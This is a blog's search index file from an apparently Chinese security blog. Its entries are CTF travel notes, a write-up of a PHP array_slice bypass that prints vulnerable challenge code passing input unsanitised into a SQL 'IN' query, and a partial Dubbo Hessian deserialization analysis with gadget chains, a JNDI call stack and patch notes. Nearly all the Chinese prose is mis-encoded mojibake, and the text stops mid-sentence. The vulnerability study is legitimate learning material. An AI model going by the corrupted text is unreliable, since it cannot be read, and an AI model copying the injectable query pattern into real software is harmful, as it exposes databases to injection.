<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>ç¾ŠåŸæ¯Final-å°è®°</title>
    <link href="/2024/09/12/%E7%BE%8A%E5%9F%8E%E6%9D%AFFinal-%E5%B0%8F%E8%AE%B0/"/>
    <url>/2024/09/12/%E7%BE%8A%E5%9F%8E%E6%9D%AFFinal-%E5%B0%8F%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<p>è¿™æ¬¡æœ¬ç§‘ç»„ç¬¬äºŒå•¦ï¼ï¼ï¼ï¼ˆç¬¬ä¸€æ˜¯æˆ‘ä»¬å¤©æ¢å­¦é•¿ï¼Œtqlå‘œå‘œå‘œï¼Œç›´æ¥æŠŠé¶åœºæ‰“ç©¿akäº†ğŸ˜­ğŸ˜­ğŸ˜­ï¼‰</p><p><img src="/2024/09/12/%E7%BE%8A%E5%9F%8E%E6%9D%AFFinal-%E5%B0%8F%E8%AE%B0/image-20240915143449487.png" alt="image-20240915143449487"></p><p>ï¼ˆè¿™é‡Œä¸å¾—ä¸æä¸€ä¸ª7æœˆä»½çš„sbæ¯”èµ›ï¼Œæˆ‘ä»¬æ‰“åˆ°å…¨å›½æ€»å† å†›éƒ½ä¸ç»™å¥–é‡‘å’Œå¥–æ¯ï¼Œä¸»åŠæ–¹è¿˜è£…æ­»â€¦â€¦ï¼‰</p><p>æˆ‘ä¸æ‰“ç®—è®°finalæ€ä¹ˆæ‰“çš„ï¼Œä½†ä¹Ÿç¡®å®ä¸å¥½è®°ï¼Œå¤šç½‘å¡è·³æ¥è·³å»çš„ï¼Œä¹Ÿæ²¡å’‹è®°å½•ï¼Œæœ‰ç‚¹éš¾ç»·â€¦â€¦</p><p>æ‰€ä»¥è®°ä¸€ä¸‹å¹¿å·ä¹‹æ—…å§~~</p><h2 id="ä¸Šé£æœºå–½"><a href="#ä¸Šé£æœºå–½" class="headerlink" title="ä¸Šé£æœºå–½"></a>ä¸Šé£æœºå–½</h2><p><img src="/2024/09/12/%E7%BE%8A%E5%9F%8E%E6%9D%AFFinal-%E5%B0%8F%E8%AE%B0/image-20240915143510190.png" alt="image-20240915143510190"></p><h2 id="å¤©æ°”çœŸçš„å¾ˆå¥½ï¼ï¼ï¼ï¼"><a href="#å¤©æ°”çœŸçš„å¾ˆå¥½ï¼ï¼ï¼ï¼" class="headerlink" title="å¤©æ°”çœŸçš„å¾ˆå¥½ï¼ï¼ï¼ï¼"></a>å¤©æ°”çœŸçš„å¾ˆå¥½ï¼ï¼ï¼ï¼</h2><p><img src="/2024/09/12/%E7%BE%8A%E5%9F%8E%E6%9D%AFFinal-%E5%B0%8F%E8%AE%B0/image-20240915143525788.png" alt="image-20240915143525788"></p><p><img src="/2024/09/12/%E7%BE%8A%E5%9F%8E%E6%9D%AFFinal-%E5%B0%8F%E8%AE%B0/image-20240915143539210.png" alt="image-20240915143539210"></p><h2 id="ä¸‹é¢èµ¶åˆ°æˆ˜åœºçš„æ˜¯ï¼Œå¤©æ¢æ¸—é€çœŸç¥F4ï¼ˆå·æ‹å­¦é•¿èƒŒå½±ï¼‰ï¼š"><a href="#ä¸‹é¢èµ¶åˆ°æˆ˜åœºçš„æ˜¯ï¼Œå¤©æ¢æ¸—é€çœŸç¥F4ï¼ˆå·æ‹å­¦é•¿èƒŒå½±ï¼‰ï¼š" class="headerlink" title="ä¸‹é¢èµ¶åˆ°æˆ˜åœºçš„æ˜¯ï¼Œå¤©æ¢æ¸—é€çœŸç¥F4ï¼ˆå·æ‹å­¦é•¿èƒŒå½±ï¼‰ï¼š"></a>ä¸‹é¢èµ¶åˆ°æˆ˜åœºçš„æ˜¯ï¼Œå¤©æ¢æ¸—é€çœŸç¥F4ï¼ˆå·æ‹å­¦é•¿èƒŒå½±ï¼‰ï¼š</h2><p><img src="/2024/09/12/%E7%BE%8A%E5%9F%8E%E6%9D%AFFinal-%E5%B0%8F%E8%AE%B0/image-20240915143555579.png" alt="image-20240915143555579"></p><h2 id="æ¯”èµ›ç°åœºå¥½æ°”æ´¾ï¼ï¼ï¼ï¼ˆæ¯”æŸä¸ª7æœˆå‚åŠ çš„sbæ¯”èµ›å¥½å¤ªå¤šäº†ï¼‰"><a href="#æ¯”èµ›ç°åœºå¥½æ°”æ´¾ï¼ï¼ï¼ï¼ˆæ¯”æŸä¸ª7æœˆå‚åŠ çš„sbæ¯”èµ›å¥½å¤ªå¤šäº†ï¼‰" class="headerlink" title="æ¯”èµ›ç°åœºå¥½æ°”æ´¾ï¼ï¼ï¼ï¼ˆæ¯”æŸä¸ª7æœˆå‚åŠ çš„sbæ¯”èµ›å¥½å¤ªå¤šäº†ï¼‰"></a>æ¯”èµ›ç°åœºå¥½æ°”æ´¾ï¼ï¼ï¼ï¼ˆæ¯”æŸä¸ª7æœˆå‚åŠ çš„sbæ¯”èµ›å¥½å¤ªå¤šäº†ï¼‰</h2><p><img src="/2024/09/12/%E7%BE%8A%E5%9F%8E%E6%9D%AFFinal-%E5%B0%8F%E8%AE%B0/image-20240915143645219.png" alt="image-20240915143645219"></p><p><img src="/2024/09/12/%E7%BE%8A%E5%9F%8E%E6%9D%AFFinal-%E5%B0%8F%E8%AE%B0/image-20240915143706815.png" alt="image-20240915143706815"></p><p><img src="/2024/09/12/%E7%BE%8A%E5%9F%8E%E6%9D%AFFinal-%E5%B0%8F%E8%AE%B0/image-20240915143712249.png" alt="image-20240915143712249"></p><p><img src="/2024/09/12/%E7%BE%8A%E5%9F%8E%E6%9D%AFFinal-%E5%B0%8F%E8%AE%B0/image-20240915143717455.png" alt="image-20240915143717455"></p><p><img src="/2024/09/12/%E7%BE%8A%E5%9F%8E%E6%9D%AFFinal-%E5%B0%8F%E8%AE%B0/image-20240915143724555.png" alt="image-20240915143724555"></p><h2 id="å‚èµ›å‚èµ›ï¼ï¼ï¼"><a href="#å‚èµ›å‚èµ›ï¼ï¼ï¼" class="headerlink" title="å‚èµ›å‚èµ›ï¼ï¼ï¼"></a>å‚èµ›å‚èµ›ï¼ï¼ï¼</h2><p><img src="/2024/09/12/%E7%BE%8A%E5%9F%8E%E6%9D%AFFinal-%E5%B0%8F%E8%AE%B0/image-20240915143800698.png" alt="image-20240915143800698"></p><p><img src="/2024/09/12/%E7%BE%8A%E5%9F%8E%E6%9D%AFFinal-%E5%B0%8F%E8%AE%B0/image-20240915143805958.png" alt="image-20240915143805958"></p><p><img src="/2024/09/12/%E7%BE%8A%E5%9F%8E%E6%9D%AFFinal-%E5%B0%8F%E8%AE%B0/image-20240915143811289.png" alt="image-20240915143811289"></p><h2 id="å…‰è£ä¸‹æ’­ï¼ï¼ï¼"><a href="#å…‰è£ä¸‹æ’­ï¼ï¼ï¼" class="headerlink" title="å…‰è£ä¸‹æ’­ï¼ï¼ï¼"></a>å…‰è£ä¸‹æ’­ï¼ï¼ï¼</h2><p><img src="/2024/09/12/%E7%BE%8A%E5%9F%8E%E6%9D%AFFinal-%E5%B0%8F%E8%AE%B0/image-20240915143820614.png" alt="image-20240915143820614"></p><h2 id="ä¸Šæ–°é—»å–½ï¼ï¼ï¼"><a href="#ä¸Šæ–°é—»å–½ï¼ï¼ï¼" class="headerlink" title="ä¸Šæ–°é—»å–½ï¼ï¼ï¼"></a>ä¸Šæ–°é—»å–½ï¼ï¼ï¼</h2><p><img src="/2024/09/12/%E7%BE%8A%E5%9F%8E%E6%9D%AFFinal-%E5%B0%8F%E8%AE%B0/image-20240915143832223.png" alt="image-20240915143832223"></p><h2 id="åŒ—äº¬ä¸Šç©º"><a href="#åŒ—äº¬ä¸Šç©º" class="headerlink" title="åŒ—äº¬ä¸Šç©º"></a>åŒ—äº¬ä¸Šç©º</h2><p><img src="/2024/09/12/%E7%BE%8A%E5%9F%8E%E6%9D%AFFinal-%E5%B0%8F%E8%AE%B0/image-20240915143852287.png" alt="image-20240915143852287"></p><p><img src="/2024/09/12/%E7%BE%8A%E5%9F%8E%E6%9D%AFFinal-%E5%B0%8F%E8%AE%B0/image-20240915143856062.png" alt="image-20240915143856062"></p><p><img src="/2024/09/12/%E7%BE%8A%E5%9F%8E%E6%9D%AFFinal-%E5%B0%8F%E8%AE%B0/image-20240915143900232.png" alt="image-20240915143900232"></p><h2 id="æ•…äº‹è¿˜åœ¨ç»­å†™ï¼Œä¸–ç•Œç»ˆå°†èšç„¦äºä½ æˆ‘ï¼"><a href="#æ•…äº‹è¿˜åœ¨ç»­å†™ï¼Œä¸–ç•Œç»ˆå°†èšç„¦äºä½ æˆ‘ï¼" class="headerlink" title="æ•…äº‹è¿˜åœ¨ç»­å†™ï¼Œä¸–ç•Œç»ˆå°†èšç„¦äºä½ æˆ‘ï¼"></a>æ•…äº‹è¿˜åœ¨ç»­å†™ï¼Œä¸–ç•Œç»ˆå°†èšç„¦äºä½ æˆ‘ï¼</h2><p><img src="/2024/09/12/%E7%BE%8A%E5%9F%8E%E6%9D%AFFinal-%E5%B0%8F%E8%AE%B0/image-20240915143928869.png" alt="image-20240915143928869"></p>]]></content>
    
    
    
    <tags>
      
      <tag>æ¯”èµ›</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>äº¬æ´¥å†€æ”»é˜²-array_sliceç»•è¿‡</title>
    <link href="/2024/09/08/%E4%BA%AC%E6%B4%A5%E5%86%80%E6%94%BB%E9%98%B2-array-slice%E7%BB%95%E8%BF%87/"/>
    <url>/2024/09/08/%E4%BA%AC%E6%B4%A5%E5%86%80%E6%94%BB%E9%98%B2-array-slice%E7%BB%95%E8%BF%87/</url>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>é¢˜ç›®ä¸éš¾ï¼Œä½†æ˜¯ä¸ºä»€ä¹ˆæˆ‘è¦å†™è¿™ä¹ˆä¸€ä¸ªå°æ¯”èµ›ï¼Œå› ä¸ºæˆ‘çˆ†é›¶äº†ã€‚</p><p>å¯¹ï¼Œè‡´æ•¬ä¼ å¥‡çˆ†é›¶webæ‰‹<strong>EddieMurphy</strong>ã€‚</p><p>è·¯è¿˜å¾ˆé•¿ï¼Œç¡®å®è¿˜å¾ˆé•¿ã€‚</p><h2 id="æµ…æ"><a href="#æµ…æ" class="headerlink" title="æµ…æ"></a>æµ…æ</h2><p>å‰é¢çš„ç»•è¿‡å¾ˆç®€å•ï¼Œdataä¼ªåè®®å°±èƒ½è¿›ï¼Œphpä¼ªåè®®å°±èƒ½è¯»<code>sql_unlimited.php</code>ï¼Œç„¶åæ˜¯å°±æ˜¯è¿™ä¸ªæºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-type:text/html;charset=utf-8&quot;</span>);<br><span class="hljs-variable">$mysqli</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">mysqli</span>(<span class="hljs-string">&quot;localhost&quot;</span>,<span class="hljs-string">&quot;root&quot;</span>,<span class="hljs-string">&quot;toor&quot;</span>,<span class="hljs-string">&quot;unlimited&quot;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">mysqli_connect_error</span>())&#123;<br><span class="hljs-title function_ invoke__">printf</span>(<span class="hljs-string">&quot;connecte failed%s&lt;br&gt;&quot;</span>,<span class="hljs-title function_ invoke__">mysqli_connect_error</span>());<br><span class="hljs-keyword">exit</span>();<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sql_sel</span>(<span class="hljs-params"><span class="hljs-variable">$id</span></span>)</span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$id</span>))&#123;<br>    <span class="hljs-variable">$id</span> = <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&quot;,&quot;</span>, <span class="hljs-variable">$id</span>);<br>    <span class="hljs-variable">$result</span>=<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;mysqli&#x27;</span>]-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-string">&quot;select * from info where id in (<span class="hljs-subst">$id</span>)&quot;</span>);<br>    <span class="hljs-keyword">while</span>(<span class="hljs-keyword">list</span>(<span class="hljs-variable">$id</span>,<span class="hljs-variable">$message</span>)=<span class="hljs-variable">$result</span>-&gt;<span class="hljs-title function_ invoke__">fetch_row</span>())&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;li&gt;&#x27;</span>.<span class="hljs-variable">$id</span>.<span class="hljs-string">&#x27;Ã¯Â¼Âš&#x27;</span>.<span class="hljs-variable">$message</span>.<span class="hljs-string">&#x27;&lt;/li&gt;&#x27;</span>;<br>    &#125;<br>&#125;<br>    <br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">do_co</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;id&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$post</span>=<span class="hljs-variable">$_POST</span>;<br>    <span class="hljs-keyword">if</span> (@!<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$post</span>[<span class="hljs-string">&#x27;id&#x27;</span>][<span class="hljs-number">0</span>]) || @!<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$post</span>[<span class="hljs-string">&#x27;id&#x27;</span>][<span class="hljs-number">1</span>])) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;NO! NO! NO! The Parameters must be numeric&quot;</span>);<br>    &#125;<br>    <span class="hljs-title function_ invoke__">sql_sel</span>(<span class="hljs-title function_ invoke__">array_slice</span>(<span class="hljs-variable">$post</span>[<span class="hljs-string">&#x27;id&#x27;</span>],<span class="hljs-number">0</span>,<span class="hljs-number">2</span>));<br>    &#125;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;No Permissions&#x27;</span>);   <br>    <br>&#125;<br><span class="hljs-title function_ invoke__">do_co</span>();<br></code></pre></td></tr></table></figure><p>ä¸€å¼€å§‹å‚»å‚»çš„æˆ‘è¿˜ä»¥ä¸ºç›´æ¥æ‰“åå…­è¿›åˆ¶ï¼Œä½†æ˜¯ç¡®å®æœ¬åœ°æ‰“ä¸é€šï¼Œé»”é©´æŠ€ç©·ã€‚</p><p>å’Œèµµå“¥ä¸€ç›´äº¤æµä¹Ÿæ˜¯ï¼Œæ²¡æœ‰ä»€ä¹ˆcluesï¼Œä»¥åŠé‚£é“tomcatçš„ç¼–ç ä¸Šä¼ ä¹Ÿæ˜¯ï¼Œæ²¡æœ‰è¿‡å¤šæ¥è§¦è¿™äº›é¢˜ä¹Ÿè®©æˆ‘ç–²äºåº”ä»˜ã€‚</p><p>ä½†æ˜¯SEå­¦é•¿ä¸€è¯­é“ç ´ï¼ˆtqlï¼Œè¿™æ‰æ˜¯çœŸæ­£çš„èµ›æ£ï¼‰ï¼Œç›´æ¥çœ‹åˆ°æºç çš„<code>array_slice()</code>ï¼Œæ¥è‡ªï¼š<a href="https://xz.aliyun.com/t/2087">https://xz.aliyun.com/t/2087</a>:</p><p><img src="/2024/09/08/%E4%BA%AC%E6%B4%A5%E5%86%80%E6%94%BB%E9%98%B2-array-slice%E7%BB%95%E8%BF%87/image-20240908003559993.png" alt="image-20240908003559993"></p><p>ç»“æŸäº†ï¼Œä¸€åˆ‡éƒ½ç»“æŸäº†ã€‚</p><p><img src="/2024/09/08/%E4%BA%AC%E6%B4%A5%E5%86%80%E6%94%BB%E9%98%B2-array-slice%E7%BB%95%E8%BF%87/image-20240908003056564.png" alt="image-20240908003056564"></p><p><img src="/2024/09/08/%E4%BA%AC%E6%B4%A5%E5%86%80%E6%94%BB%E9%98%B2-array-slice%E7%BB%95%E8%BF%87/image-20240908003638173.png" alt="image-20240908003638173"></p><h2 id="åè®°"><a href="#åè®°" class="headerlink" title="åè®°"></a>åè®°</h2><p>ä½†æ˜¯ï¼Œæ™šäº†ã€‚</p><p>é˜Ÿå‹æŠŠå…¶ä»–æ–¹å‘AKåˆå¦‚ä½•ï¼Œä½ çš„webçˆ†é›¶äº†ã€‚</p><p>æ’åç¬¬ä¸€åˆå¦‚ä½•ï¼Œå› ä¸ºè·Ÿä½ æ— å…³ã€‚</p><p>æ™šä¸Šå‡ºå»drinkäº†ç‚¹ğŸºï¼Œç‹¬è‡ªéª‘è¡Œåœ¨å›æ¥çš„è·¯ä¸Šï¼Œè·¯çœŸçš„å¾ˆé•¿ã€‚</p><p><img src="/2024/09/08/%E4%BA%AC%E6%B4%A5%E5%86%80%E6%94%BB%E9%98%B2-array-slice%E7%BB%95%E8%BF%87/image-20240908003742077.png" alt="image-20240908003742077"></p><p><strong>èœ€é“éš¾ï¼Œéš¾äºä¸Šé’å¤©ã€‚</strong></p>]]></content>
    
    
    
    <tags>
      
      <tag>æ¯”èµ›</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Dubbo</title>
    <link href="/2024/09/02/Dubbo/"/>
    <url>/2024/09/02/Dubbo/</url>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>è¶ç€è¿˜æ²¡å•¥æ¯”èµ›ï¼Œå°å­¦æœŸç­‰ç»„é•¿å›å¤ï¼Œçœ‹çœ‹Dubboååºåˆ—åŒ–ã€‚</p><p>ä½†æ˜¯Dubboååºåˆ—åŒ–æ ¹æ®ç‰ˆæœ¬ä¸åŒï¼ŒPOCä¹ŸæŒºå¤šçš„ï¼Œè€Œä¸”å…‰è¿™ä¸ªDubboåè®®å­¦èµ·æ¥å°±æœ‰ä¸€ç‚¹éš¾ç»·ã€‚</p><p>å…ˆæ¥çœ‹çœ‹ä»€ä¹ˆæ˜¯Dubboï¼š</p><p>Apache Dubboæ˜¯ä¸€æ¬¾é˜¿é‡Œå·´å·´å¼€æºçš„è½»é‡ã€é«˜æ€§èƒ½çš„Java RPCæ¡†æ¶</p><p>éšç€å¾®æœåŠ¡çš„ç››è¡Œï¼Œé™¤å¼€æœåŠ¡è°ƒç”¨ä¹‹å¤–ï¼ŒDubboä¹Ÿé€æ¸æ¶‰çŒæœåŠ¡æ²»ç†ã€æœåŠ¡ç›‘æ§ã€æœåŠ¡ç½‘å…³ç­‰ï¼Œå¾€Spring Cloudé æ‹¢ã€‚</p><p>Dubbo RPCæ”¯æŒå¤šç§åºåˆ—åŒ–æ–¹å¼ï¼šdubboã€hessian2ã€kryoã€fastjsonã€javaç­‰ã€‚</p><p><img src="/2024/09/02/Dubbo/image-20240902162941056.png" alt="image-20240902162941056"></p><p><img src="/2024/09/02/Dubbo/image-20240902163349526.png" alt="image-20240902163349526"></p><p>Dubboçš„æ­å»ºå°±å…äº†ï¼Œç½‘ä¸Šæœ‰å¤ªå¤šå¤ªå¤šï¼Œè·Ÿç€æ­å°±è¡Œäº†ã€‚</p><p><a href="https://github.com/apache/dubbo-samples">https://github.com/apache/dubbo-samples</a></p><p>ä½¿ç”¨DubboæœåŠ¡éœ€è¦æœ‰ä¸€ä¸ªæ³¨å†Œä¸­å¿ƒzookeeper</p><p><a href="https://zookeeper.apache.org/releases.html">https://zookeeper.apache.org/releases.html</a></p><h2 id="Dubbo-Attack"><a href="#Dubbo-Attack" class="headerlink" title="Dubbo-Attack"></a>Dubbo-Attack</h2><h3 id="Hessian"><a href="#Hessian" class="headerlink" title="Hessian"></a>Hessian</h3><h4 id=""><a href="#" class="headerlink" title="&lt;&#x3D;2.7.6"></a>&lt;&#x3D;2.7.6</h4><h5 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h5><p>å½±å“èŒƒå›´ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-number">2.7</span><span class="hljs-number">.0</span> &lt;= Dubbo Version &lt;= <span class="hljs-number">2.7</span><span class="hljs-number">.6</span><br><span class="hljs-number">2.6</span><span class="hljs-number">.0</span> &lt;= Dubbo Version &lt;= <span class="hljs-number">2.6</span><span class="hljs-number">.7</span><br>Dubbo æ‰€æœ‰ <span class="hljs-number">2.5</span>.x ç‰ˆæœ¬ï¼ˆå®˜æ–¹å›¢é˜Ÿç›®å‰å·²ä¸æ”¯æŒï¼‰<br></code></pre></td></tr></table></figure><p>è¿™é‡Œä¸»è¦æ˜¯å› ä¸ºdubboé»˜è®¤é€šè¿‡hessianåè®®è¿›è¡Œååºåˆ—åŒ–é€ æˆçš„æ¼æ´ï¼Œç¯å¢ƒå¯çœ‹ï¼š</p><p><a href="https://github.com/apache/dubbo-spring-boot-project">https://github.com/apache/dubbo-spring-boot-project</a></p><p>å¯ä»¥åœ¨pom.xmlä¸­æ¡ä»¶åˆ©ç”¨ä¾èµ–ï¼Œæœ‰æœ‰å¾ˆå¤šåˆ©ç”¨é“¾ï¼Œæ ¹æ®æœ‰ä»€ä¹ˆä¾èµ–æ‰“ä»€ä¹ˆé“¾ã€‚</p><p>æ¯”å¦‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">SpringPartiallyComparableAdvisorHolder<br>SpringAbstractBeanFactoryPointcutAdvisor<br>Rome<br>ROME+CC<br>Groovy<br></code></pre></td></tr></table></figure><p>ç­‰ç­‰ã€‚</p><p>ä»¥JNDIæ³¨å…¥æ‰“ROME+CCä¸ºä¾‹ï¼š</p><p>è°ƒç”¨æ ˆï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java">connect:<span class="hljs-number">624</span>, JdbcRowSetImpl (com.sun.rowset)<br>getDatabaseMetaData:<span class="hljs-number">4004</span>, JdbcRowSetImpl (com.sun.rowset)<br>invoke0:-<span class="hljs-number">1</span>, NativeMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">62</span>, NativeMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">498</span>, Method (java.lang.reflect)<br>toString:<span class="hljs-number">158</span>, ToStringBean (com.rometools.rome.feed.impl)<br>toString:<span class="hljs-number">129</span>, ToStringBean (com.rometools.rome.feed.impl)<br>beanHashCode:<span class="hljs-number">198</span>, EqualsBean (com.rometools.rome.feed.impl)<br>hashCode:<span class="hljs-number">180</span>, EqualsBean (com.rometools.rome.feed.impl)<br>hash:<span class="hljs-number">339</span>, HashMap (java.util)<br>put:<span class="hljs-number">612</span>, HashMap (java.util)<br>doReadMap:<span class="hljs-number">145</span>, MapDeserializer (com.alibaba.com.caucho.hessian.io)<br>readMap:<span class="hljs-number">126</span>, MapDeserializer (com.alibaba.com.caucho.hessian.io)<br>readObject:<span class="hljs-number">2703</span>, Hessian2Input (com.alibaba.com.caucho.hessian.io)<br>readObject:<span class="hljs-number">2278</span>, Hessian2Input (com.alibaba.com.caucho.hessian.io)<br>readObject:<span class="hljs-number">2080</span>, Hessian2Input (com.alibaba.com.caucho.hessian.io)<br>readObject:<span class="hljs-number">2074</span>, Hessian2Input (com.alibaba.com.caucho.hessian.io)<br>readObject:<span class="hljs-number">92</span>, Hessian2ObjectInput (org.apache.dubbo.common.serialize.hessian2)<br>decode:<span class="hljs-number">139</span>, DecodeableRpcInvocation (org.apache.dubbo.rpc.protocol.dubbo)<br>decode:<span class="hljs-number">79</span>, DecodeableRpcInvocation (org.apache.dubbo.rpc.protocol.dubbo)<br>decode:<span class="hljs-number">57</span>, DecodeHandler (org.apache.dubbo.remoting.transport)<br>received:<span class="hljs-number">44</span>, DecodeHandler (org.apache.dubbo.remoting.transport)<br>run:<span class="hljs-number">57</span>, ChannelEventRunnable (org.apache.dubbo.remoting.transport.dispatcher)<br>runWorker:<span class="hljs-number">1149</span>, ThreadPoolExecutor (java.util.concurrent)<br>run:<span class="hljs-number">624</span>, ThreadPoolExecutor$Worker (java.util.concurrent)<br>run:<span class="hljs-number">748</span>, Thread (java.lang)<br></code></pre></td></tr></table></figure><p>ç¯å¢ƒæ­å»ºå·ä¸ªæ‡’ï¼Œç›´æ¥è´´å›¾åˆ†æä¸€æ³¢ã€‚</p><p>å‰é¢éƒ½æ˜¯æ–¹æ³•çš„è§¦å‘è°ƒç”¨ï¼Œæˆ‘ä»¬ç›´æ¥çœ‹åˆ°<code>DecodeHandler#received</code>ï¼š</p><p><img src="/2024/09/02/Dubbo/image-20240903165421675.png" alt="image-20240903165421675"></p><p>è·Ÿè¿›åˆ°æ— å‚æ–¹æ³•ï¼š</p><p><img src="/2024/09/02/Dubbo/image-20240903165444785.png" alt="image-20240903165444785"></p><p>è¿™é‡Œçš„inputStreamæ˜¯å»æ‰Dubboåè®®å¤´çš„åŸå§‹æ•°æ®ï¼š</p><p><img src="/2024/09/02/Dubbo/image-20240903165535368.png" alt="image-20240903165535368"></p><p>æ­¤å¤„è·å–äº†æ•°æ®ä½“çš„å„ä¸ªä¿¡æ¯ï¼Œå…¶æ¬¡è¿›è¡Œæ•°æ®å¤„ç†åï¼š</p><p><img src="/2024/09/02/Dubbo/image-20240903165632577.png" alt="image-20240903165632577"></p><p>çœ‹åˆ°readObjectäº†ï¼Œè¿™é‡Œçš„inæ˜¯<code>Hessian2ObjectInput</code>è¾“å…¥æµå¯¹è±¡ï¼Œç»§ç»­è°ƒç”¨<code>readObject</code>æ–¹æ³•ï¼Œ</p><p>ç»§ç»­è°ƒç”¨<code>readObject</code>æ–¹æ³•ï¼Œä¹‹åä¼šåœ¨readObjectæ–¹æ³•è°ƒç”¨ä¸­è®¡ç®—å‡ºtagæ ‡è¯†</p><p><img src="/2024/09/02/Dubbo/image-20240903165759294.png" alt="image-20240903165759294"></p><p>ä¹‹åé€šè¿‡switch caseè¯­å¥è¿›è¡Œå¯¹åº”é€»è¾‘è°ƒç”¨:</p><p><img src="/2024/09/02/Dubbo/image-20240903165817817.png" alt="image-20240903165817817"></p><p>æ¥åˆ°äº†<code>MapDerializer#readMap</code>çš„è°ƒç”¨ï¼Œåé¢å°±æ˜¯hessiané“¾äº†ï¼š</p><p><img src="/2024/09/02/Dubbo/image-20240903165926476.png" alt="image-20240903165926476"></p><p>åç»­è·Ÿè¿›å°±ä¸å†™äº†ï¼Œå¯ä»¥å»çœ‹åŸæ–‡ç« ï¼š<a href="https://tttang.com/archive/1730/#toc_hessian">Dubboååºåˆ—åŒ–æ¼æ´åˆ†æé›†åˆ1 - è·³è·³ç³– (tttang.com)</a></p><h5 id="patch"><a href="#patch" class="headerlink" title="patch"></a>patch</h5><p>æ ¹æ®diffåˆ†æ</p><p><a href="https://github.com/apache/dubbo/compare/dubbo-2.7.6...dubbo-2.7.7#diff-a32630b1035c586f6eae2d778e19fc172e986bb0be1d4bc642f8ee79df48ade0L131">https://github.com/apache/dubbo/compare/dubbo-2.7.6...dubbo-2.7.7#diff-a32630b1035c586f6eae2d778e19fc172e986bb0be1d4bc642f8ee79df48ade0L131</a></p><p><img src="/2024/09/02/Dubbo/image-20240903170206345.png" alt="image-20240903170206345"></p><p>åˆ¤æ–­äº†æ–¹æ³•åæ˜¯å¦ç­‰äº<code>$invoke $echo $invokeAsync</code> ,å¦‚æœæ–¹æ³•åç§°ä¸å¯¹çš„è¯, å°±ä¼šç›´æ¥æŠ›å‡ºå¼‚å¸¸</p><h4 id="2-7-7"><a href="#2-7-7" class="headerlink" title="2.7.7"></a>2.7.7</h4><p>è™½ç„¶åœ¨2.7.7ç‰ˆæœ¬ä¸­åˆ¤æ–­äº†æ–¹æ³•åç§°, 